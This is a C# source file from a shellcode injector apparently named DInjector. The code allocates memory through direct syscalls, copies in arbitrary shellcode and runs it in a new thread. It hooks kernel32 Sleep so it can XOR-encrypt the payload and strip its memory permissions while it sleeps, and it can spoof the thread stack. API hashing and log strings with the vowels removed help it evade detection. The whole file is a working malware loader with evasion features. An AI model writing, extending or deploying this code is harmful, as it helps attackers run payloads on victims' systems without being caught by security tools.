using System;
using System.IO;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class CurrentThread
    {
        delegate void FunctionPtr();
        delegate void ExecuteShellcode(IntPtr shellcodeAddress);

        public static void Execute(byte[] shellcode, uint protect, uint timeout, int flipSleep, uint fluctuate, bool spoofStack, bool debug = false)
        {
            uint allocProtect = 0, newProtect = 0;
            string strAllocProtect = "", strNewProtect = "";
            if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READ)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
                strAllocProtect = "PAGE_READWRITE";
                newProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;
                strNewProtect = "PAGE_EXECUTE_READ";
            }
            else if (protect == DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                strAllocProtect = "PAGE_EXECUTE_READWRITE";
            }

            bool suspended = false;
            if (flipSleep > 0)
            {
                allocProtect = DI.Data.Win32.WinNT.PAGE_READWRITE;
                strAllocProtect = "PAGE_READWRITE";
                newProtect = DI.Data.Win32.WinNT.PAGE_NOACCESS;
                strNewProtect = "PAGE_NOACCESS";
                suspended = true;
            }

            #region NtAllocateVirtualMemory (allocProtect)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                allocProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine($"(CurrentThread) [+] NtAllctVrtlMmry, {strAllocProtect}");
            else
                throw new Exception($"(CurrentThread) [-] NtAllctVrtlMmry, {strAllocProtect}: {ntstatus}");

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            #endregion

            IntPtr protectAddress;
            uint oldProtect = 0;
            if (newProtect > 0)
            {
                #region NtProtectVirtualMemory (newProtect)

                protectAddress = baseAddress;
                regionSize = (IntPtr)shellcode.Length;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    newProtect,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine($"(CurrentThread) [+] NtPrtctVrtlMmry, {strNewProtect}");
                else
                    throw new Exception($"(CurrentThread) [-] NtPrtctVrtlMmry, {strNewProtect}: {ntstatus}");

                #endregion
            }

            var fs = new FluctuateShellcode(fluctuate, spoofStack, baseAddress, shellcode.Length, debug);
            if (fluctuate != 0)
            {
                var strFluctuate = "PAGE_READWRITE";
                if (fluctuate == DI.Data.Win32.WinNT.PAGE_NOACCESS)
                    strFluctuate = "PAGE_NOACCESS";

                if (fs.EnableHook())
                    Console.WriteLine($"(CurrentThread) [+] Installed hook for KERNEL32$Sleep to fluctuate with {strFluctuate}");
            }

            #region NtCreateThreadEx

            IntPtr hThread = IntPtr.Zero;

            ntstatus = Syscalls.NtCreateThreadEx(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                baseAddress,
                IntPtr.Zero,
                suspended,
                0,
                0,
                0,
                IntPtr.Zero);

            /*ntstatus = Syscalls.NtCreateThreadExDelegate(
                ref hThread,
                DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                IntPtr.Zero,
                hProcess,
                new ExecuteShellcode(Run),
                baseAddress,
                suspended,
                0,
                0,
                0,
                IntPtr.Zero);*/

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtCrtThrdEx");
            else
                throw new Exception($"(CurrentThread) [-] NtCrtThrdEx: {ntstatus}");

            #endregion

            if (flipSleep > 0)
            {
                #region NtDelayExecution (flipSleep)

                Console.WriteLine($"(CurrentThread) [=] Delaying execution for {flipSleep} ms before resuming the thread ...");

                Win32.LARGE_INTEGER liFlipSleep = new Win32.LARGE_INTEGER() { QuadPart = (-1) * flipSleep * 10000 };

                ntstatus = Syscalls.NtDelayExecution(
                    false,
                    ref liFlipSleep);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread) [+] NtDlyExctn, flipSleep");
                else
                    throw new Exception($"(CurrentThread) [-] NtDlyExctn, flipSleep: {ntstatus}");

                #endregion

                #region NtProtectVirtualMemory (protect)

                protectAddress = baseAddress;
                regionSize = (IntPtr)shellcode.Length;
                oldProtect = 0;

                ntstatus = Syscalls.NtProtectVirtualMemory(
                    hProcess,
                    ref protectAddress,
                    ref regionSize,
                    protect,
                    ref oldProtect);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread) [+] NtPrtctVrtlMmry, protect");
                else
                    throw new Exception($"(CurrentThread) [-] NtPrtctVrtlMmry, protect: {ntstatus}");

                #endregion

                #region NtResumeThread

                uint suspendCount = 0;

                ntstatus = Syscalls.NtResumeThread(
                    hThread,
                    ref suspendCount);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread) [+] NtRsmThrd");
                else
                    throw new Exception($"(CurrentThread) [-] NtRsmThrd: {ntstatus}");

                #endregion
            }

            if (timeout > 0) // if the shellcode does not need to serve forever, we can do the clean up
            {
                #region NtWaitForSingleObject (timeout)

                Console.WriteLine($"(CurrentThread) [=] Waiting for {timeout} ms before cleanup ...");

                // https://github.com/vxunderground/VXUG-Papers/blob/c3bd670c45223baf0af8bfb795d688a104cd0197/Hells%20Gate/C%23%20Implementation/SharpHellsGate/HellsGate.cs#L268-L270
                Win32.LARGE_INTEGER liTimeout = new Win32.LARGE_INTEGER() { QuadPart = (-1) * timeout * 10000 };

                ntstatus = Syscalls.NtWaitForSingleObject(
                    hThread,
                    false,
                    ref liTimeout);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_SUCCESS, timeout");
                else if (ntstatus == NTSTATUS.Timeout)
                    Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_TIMEOUT, timeout");
                else
                    throw new Exception($"(CurrentThread) [-] NtWtFrSnglObjct, timeout: {ntstatus}");

                #endregion

                if (oldProtect > 0)
                {
                    #region CleanUp: NtProtectVirtualMemory (PAGE_READWRITE)

                    protectAddress = baseAddress;
                    regionSize = (IntPtr)shellcode.Length;
                    uint tmpProtect = 0;

                    ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref protectAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_READWRITE,
                        ref tmpProtect);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine("(CurrentThread.CleanUp) [+] NtPrtctVrtlMmry, PAGE_READWRITE");
                    else
                        throw new Exception($"(CurrentThread.CleanUp) [-] NtPrtctVrtlMmry, PAGE_READWRITE: {ntstatus}");

                    #endregion
                }

                // Zero out shellcode bytes
                Marshal.Copy(new byte[shellcode.Length], 0, baseAddress, shellcode.Length);

                #region CleanUp: NtFreeVirtualMemory (shellcode)

                regionSize = (IntPtr)shellcode.Length;

                ntstatus = Syscalls.NtFreeVirtualMemory(
                    hProcess,
                    ref baseAddress,
                    ref regionSize,
                    DI.Data.Win32.Kernel32.MEM_RELEASE);

                if (ntstatus == NTSTATUS.Success)
                    Console.WriteLine("(CurrentThread.CleanUp) [+] NtFrVrtlMmry, shellcode");
                else
                    throw new Exception($"(CurrentThread.CleanUp) [-] NtFrVrtlMmry, shellcode: {ntstatus}");

                #endregion
            }

            #region NtWaitForSingleObject (inf)

            Win32.LARGE_INTEGER liInf = new Win32.LARGE_INTEGER() { QuadPart = 0x7FFFFFFFFFFFFFFF };

            ntstatus = Syscalls.NtWaitForSingleObject(
                hThread,
                false,
                ref liInf);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_SUCCESS, inf");
            else if (ntstatus == NTSTATUS.Timeout)
                Console.WriteLine("(CurrentThread) [+] NtWtFrSnglObjct|STATUS_TIMEOUT, inf");
            else
                throw new Exception($"(CurrentThread) [-] NtWtFrSnglObjct, inf: {ntstatus}");

            #endregion

            if (fluctuate != 0)
                if (fs.DisableHook())
                    Console.WriteLine($"(CurrentThread) [+] Uninstalled hook for KERNEL32$Sleep");

            Syscalls.NtClose(hThread);
        }

        static void Run(IntPtr shellcodeAddress)
        {
            FunctionPtr f = (FunctionPtr)Marshal.GetDelegateForFunctionPointer(shellcodeAddress, typeof(FunctionPtr));
            f();
        }
    }

    /// <summary>
    /// Inspired by: https://twitter.com/_RastaMouse/status/1443923456630968320
    /// Adopted from: https://github.com/mgeeky/ShellcodeFluctuation
    /// </summary>
    class FluctuateShellcode
    {
        delegate void Sleep(uint dwMilliseconds);
        readonly Sleep sleepOrig, sleepOrigMethod;
        readonly GCHandle gchSleepDetour;

        readonly IntPtr sleepOriginAddress, sleepDetourAddress;
        readonly byte[] sleepOriginBytes = new byte[16], sleepDetourBytes;

        readonly byte[] trampoline =
        {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
            0x41, 0xFF, 0xE2                                            // jmp r10
        };

        readonly uint fluctuateWith;
        readonly bool enableThreadStackSpoofing;
        readonly IntPtr shellcodeAddress;
        readonly int shellcodeLength;
        readonly byte[] xorKey;
        readonly bool printDebug;

        IntPtr mainFiber = IntPtr.Zero;
        uint sleepTime;

        public FluctuateShellcode(uint fluctuate, bool spoofStack, IntPtr shellcodeAddr, int shellcodeLen, bool debug)
        {
            // { API_HASHING:Sleep }
            sleepOriginAddress = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "28e113f99b252b655e08307d55d4839d", 0x14bf6f02);
            sleepOrig = (Sleep)Marshal.GetDelegateForFunctionPointer(sleepOriginAddress, typeof(Sleep));
            Marshal.Copy(sleepOriginAddress, sleepOriginBytes, 0, 16);

            sleepOrigMethod = new Sleep(SleepOrig);

            var sleepDetour = new Sleep(SleepDetour);
            sleepDetourAddress = Marshal.GetFunctionPointerForDelegate(sleepDetour);
            gchSleepDetour = GCHandle.Alloc(sleepDetour); // https://stackoverflow.com/a/8496328/6253579

            using (var ms = new MemoryStream())
            using (var bw = new BinaryWriter(ms))
            {
                bw.Write((ulong)sleepDetourAddress);
                sleepDetourBytes = ms.ToArray();
            }

            for (var i = 0; i < sleepDetourBytes.Length; i++)
                trampoline[i + 2] = sleepDetourBytes[i];

            fluctuateWith = fluctuate;
            enableThreadStackSpoofing = spoofStack;
            shellcodeAddress = shellcodeAddr;
            shellcodeLength = shellcodeLen;
            xorKey = GenerateXorKey();
            printDebug = debug;
        }

        ~FluctuateShellcode()
        {
            if (gchSleepDetour.IsAllocated)
                gchSleepDetour.Free();

            DisableHook();
        }

        void SleepOrig(uint dwMilliseconds)
        {
            sleepOrig(sleepTime);
            Win32.SwitchToFiber(mainFiber);
        }

        void SleepDetour(uint dwMilliseconds)
        {
            DisableHook();
            ProtectMemory(fluctuateWith, printDebug);
            XorMemory();

            if (enableThreadStackSpoofing)
            {
                if (mainFiber == IntPtr.Zero)
                    mainFiber = Win32.ConvertThreadToFiber(IntPtr.Zero);

                if (mainFiber != IntPtr.Zero)
                {
                    sleepTime = dwMilliseconds;
                    var sleepFiber = Win32.CreateFiber(0, sleepOrigMethod, IntPtr.Zero);
                    Win32.SwitchToFiber(sleepFiber);
                    Win32.DeleteFiber(sleepFiber);
                }
            }
            else
            {
                sleepOrig(dwMilliseconds);
            }

            XorMemory();
            ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ, printDebug);
            EnableHook();
        }

        public bool EnableHook()
        {
            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr protectAddress = sleepOriginAddress;
            IntPtr regionSize = (IntPtr)trampoline.Length;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                ref oldProtect);

            bool hooked = false;
            if (ntstatus == NTSTATUS.Success)
            {
                Marshal.Copy(trampoline, 0, sleepOriginAddress, trampoline.Length);
                hooked = true;
            }

            #endregion

            #region NtFlushInstructionCache (sleepOriginAddress, trampolineLength)

            hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr flushAddress = sleepOriginAddress;

            ntstatus = Syscalls.NtFlushInstructionCache(
                hProcess,
                ref flushAddress,
                (uint)trampoline.Length);

            bool flushed = false;
            if (ntstatus == NTSTATUS.Success)
                flushed = true;

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = sleepOriginAddress;
            regionSize = (IntPtr)trampoline.Length;
            uint tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            return ntstatus == NTSTATUS.Success && hooked && flushed;

            #endregion
        }

        public bool DisableHook()
        {
            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr protectAddress = sleepOriginAddress;
            IntPtr regionSize = (IntPtr)sleepOriginBytes.Length;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                ref oldProtect);

            bool unhooked = false;
            if (ntstatus == NTSTATUS.Success)
            {
                Marshal.Copy(sleepOriginBytes, 0, sleepOriginAddress, sleepOriginBytes.Length);
                unhooked = true;
            }

            #endregion

            #region NtFlushInstructionCache (sleepOriginAddress, sleepOriginBytesLength)

            hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr flushAddress = sleepOriginAddress;

            ntstatus = Syscalls.NtFlushInstructionCache(
                hProcess,
                ref flushAddress,
                (uint)sleepOriginBytes.Length);

            bool flushed = false;
            if (ntstatus == NTSTATUS.Success)
                flushed = true;

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            protectAddress = sleepOriginAddress;
            regionSize = (IntPtr)sleepOriginBytes.Length;
            uint tmpProtect = 0;

            ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                ref tmpProtect);

            return ntstatus == NTSTATUS.Success && unhooked && flushed;

            #endregion
        }

        void ProtectMemory(uint newProtect, bool printDebug)
        {
            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr protectAddress = shellcodeAddress;
            IntPtr regionSize = (IntPtr)shellcodeLength;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                newProtect,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
            {
                if (printDebug)
                    Console.WriteLine("(FluctuateShellcode) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + " to 0x" + newProtect.ToString("X2"));
            }
            else
                throw new Exception($"(FluctuateShellcode) [-] NtPrtctVrtlMmry, newProtect: {ntstatus}");
        }

        void XorMemory()
        {
            byte[] data = new byte[shellcodeLength];
            Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);

            for (var i = 0; i < data.Length; i++)
                data[i] ^= xorKey[i]; // one-time pad

            Marshal.Copy(data, 0, shellcodeAddress, data.Length);
        }

        byte[] GenerateXorKey()
        {
            Random rnd = new Random();
            byte[] xorKey = new byte[shellcodeLength];
            rnd.NextBytes(xorKey);
            return xorKey;
        }
    }

    /*class FluctuateShellcodeMiniHook
    {
        // using MinHook; // https://github.com/CCob/MinHook.NET

        delegate void Sleep(uint dwMilliseconds);
        readonly Sleep sleepOrig;
        readonly HookEngine hookEngine;

        readonly uint fluctuateWith;
        readonly IntPtr shellcodeAddress;
        readonly int shellcodeLength;
        readonly byte[] xorKey;

        public FluctuateShellcodeMiniHook(uint fluctuate, IntPtr shellcodeAddr, int shellcodeLen)
        {
            hookEngine = new HookEngine();
            sleepOrig = hookEngine.CreateHook("kernel32.dll", "Sleep", new Sleep(SleepDetour));

            fluctuateWith = fluctuate;
            shellcodeAddress = shellcodeAddr;
            shellcodeLength = shellcodeLen;
            xorKey = GenerateXorKey();
        }

        ~FluctuateShellcodeMiniHook()
        {
            hookEngine.DisableHooks();
        }

        public void EnableHook()
        {
            hookEngine.EnableHooks();
        }

        public void DisableHook()
        {
            hookEngine.DisableHooks();
        }

        void SleepDetour(uint dwMilliseconds)
        {
            ProtectMemory(fluctuateWith);
            XorMemory();

            sleepOrig(dwMilliseconds);

            XorMemory();
            ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);
        }

        void ProtectMemory(uint newProtect)
        {
            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr protectAddress = shellcodeAddress;
            IntPtr regionSize = (IntPtr)shellcodeLength;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                newProtect,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success) //{ }
                Console.WriteLine("(FluctuateShellcodeMiniHook) [DEBUG] Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.ToInt64()) + " to 0x" + newProtect.ToString("X2"));
            else
                throw new Exception($"(FluctuateShellcodeMiniHook) [-] NtPrtctVrtlMmry, protect: {ntstatus}");
        }

        void XorMemory()
        {
            byte[] data = new byte[shellcodeLength];
            Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);
            for (var i = 0; i < data.Length; i++) data[i] ^= xorKey[i];
            Marshal.Copy(data, 0, shellcodeAddress, data.Length);
        }

        byte[] GenerateXorKey()
        {
            Random rnd = new Random();
            byte[] xorKey = new byte[shellcodeLength];
            rnd.NextBytes(xorKey);
            return xorKey;
        }
    }*/
}